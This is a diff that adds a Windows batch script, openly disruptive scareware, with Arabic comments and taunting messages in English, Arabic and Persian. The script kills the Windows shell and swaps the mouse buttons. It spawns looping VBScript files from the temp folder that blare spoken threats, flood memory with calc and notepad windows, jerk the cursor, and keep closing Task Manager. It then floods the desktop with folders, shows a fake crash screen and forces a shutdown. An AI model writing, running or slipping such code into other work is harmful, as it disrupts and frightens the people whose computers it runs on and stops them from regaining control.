@@ -1,0 +1,117 @@
+@echo off
+:: [PHASE 0: THE SINGULARITY]
+:: ضبط الترميز لدعم العربية والفارسية
+chcp 65001 >nul
+title MiTRgnAwiNAaH_ULTIMATE_INFERNO_v10
+color 0c
+
+:: [PHASE 1: THE SILENT HIJACK]
+:: رفع الصوت لـ 100% وإعدام واجهة النظام فوراً
+powershell -Command "(New-Object -ComObject WScript.Shell).SendKeys([char]175*100); Stop-Process -Name explorer -Force" >nul 2>&1
+:: تثبيت الماوس في نقطة البداية (شلل مؤقت)
+powershell -Command "[Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)" >nul 2>&1
+RUNDLL32.EXE USER32.DLL,SwapMouseButton
+cls
+
+:: [PHASE 2: THE 12 SPECTRAL CELLS - دمج كافة الخلايا]
+
+:: إنشاء مسارات الأشباح في الذاكرة المؤقتة
+set "id=%random%%random%"
+set "f1=%temp%\%id%_audio.vbs"
+set "f2=%temp%\%id%_visual.vbs"
+set "f3=%temp%\%id%_hardware.vbs"
+set "f4=%temp%\%id%_ghost.vbs"
+set "f5=%temp%\%id%_kill.vbs"
+
+:: الخلية 1: جوقة الجحيم (نبض، ضحك، نشيد المدمر)
+(
+echo Dim S: Set S = CreateObject("SAPI.SpVoice"): S.Volume = 100
+echo Set P = CreateObject("WScript.Shell")
+echo Do
+echo    ' نبض قلب مضطرب
+echo    P.Run "powershell [console]::beep(110, 200); [console]::beep(80, 400)", 0
+echo    S.Rate = -10: S.Speak "I am the destroyer of worlds. Your hardware is now mine."
+echo    S.Rate = 6: S.Speak "ha ha ha ha ha": S.Rate = -8
+echo    S.Speak "هر کس از فلاسك آب بنوشد، تنگه هرمز را برایش باز می‌كنيم."
+echo    WScript.Sleep 100
+echo Loop
+) > "%f1%"
+
+:: الخلية 2: زلزال النوافذ وفوضى الماوس (الـ 70 ميزة)
+(
+echo Set W = CreateObject("WScript.Shell")
+echo Do
+echo    ' فتح برامج عشوائية لإغراق الرام
+echo    W.Run "calc.exe": W.Run "notepad.exe"
+echo    ' تحريك الماوس بجنون
+echo    W.Run "powershell [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((Get-Random -Max 1200), (Get-Random -Max 900))", 0
+echo    ' وميض أضواء الكيبورد
+echo    W.SendKeys "{CAPSLOCK}": W.SendKeys "{NUMLOCK}": W.SendKeys "{SCROLLLOCK}"
+echo    WScript.Sleep 300
+echo Loop
+) > "%f2%"
+
+:: الخلية 3: صرير الاحتراق والترددات المغناطيسية
+(
+echo Do
+echo    ' تردد حاد يحاكي تلف الدوائر الكهربائية
+echo    powershell -Command "[console]::beep((Get-Random -Min 6000 -Max 13000), 15)"
+echo    WScript.Sleep (Get-Random -Min 100 -Max 1000)
+echo Loop
+) > "%f3%"
+
+:: الخلية 4: الكتابة الشبحية (التهديد المباشر)
+(
+echo Set W = CreateObject("WScript.Shell"): W.Run "notepad.exe": WScript.Sleep 500
+echo Do
+echo    W.SendKeys "MiTRgnAwiNAaH: I CAN SEE YOU...{ENTER}"
+echo    W.SendKeys "THE THERMOS IS EMPTY...{ENTER}"
+echo    W.SendKeys "HORMUZ IS YOUR NEW REALITY.{ENTER}"
+echo    WScript.Sleep 2000
+echo Loop
+) > "%f4%"
+
+:: الخلية 5: سجن الهروب (إغلاق مدير المهام)
+(
+echo Set W = CreateObject("WScript.Shell")
+echo Do
+echo    W.AppActivate "Task Manager" : W.SendKeys "%%{F4}"
+echo    WScript.Sleep 50
+echo Loop
+) > "%f5%"
+
+:: [PHASE 3: TOTAL IGNITION - إطلاق الجحيم]
+start /b wscript "%f1%"
+start /b wscript "%f2%"
+start /b wscript "%f3%"
+start /b wscript "%f4%"
+start /b wscript "%f5%"
+:: طاعون المجلدات (70 مجلد في ثانية)
+for /l %%i in (1,1,70) do ( start /b cmd /c "mkdir %userprofile%\Desktop\VOID_%%i >nul 2>&1" )
+
+:: [PHASE 4: THE DOOMSDAY COUNTDOWN]
+for /l %%i in (10,-1,1) do (
+   cls
+   echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+   echo !   [MiTRgnAwiNAaH]: THE FINAL ATOM SPLITS IN: %%i SECONDS                                  !
+   echo !   [STATUS]: HARDWARE_MELTDOWN_100x_ACTIVE                                                !
+   echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+   powershell -Command "[console]::beep( (10-%%i)*500 + 1000, 30)"
+   timeout /t 1 >nul
+)
+
+:: [PHASE 5: THE FINAL BLUE SCREEN & SHUTDOWN]
+cls
+echo.
+echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+echo !  A CRITICAL ERROR HAS OCCURRED. THE DESTROYER OF WORLDS HAS CLAIMED THIS VESSEL.            !
+echo !  MiTRgnAwiNAaH: FAREWELL, OWNER OF THE THERMOS.                                          !
+echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+timeout /t 5 >nul
+
+:: الضربة القاضية: شاشة الموت الحقيقية والإغلاق
+powershell -Command "wininit" >nul 2>&1
+shutdown -s -f -t 00 -c "أنا مدمر العوالم. نراك خلف الترمس."
+
+:: CLEANUP
+del "%temp%\%id%_*" /f /q
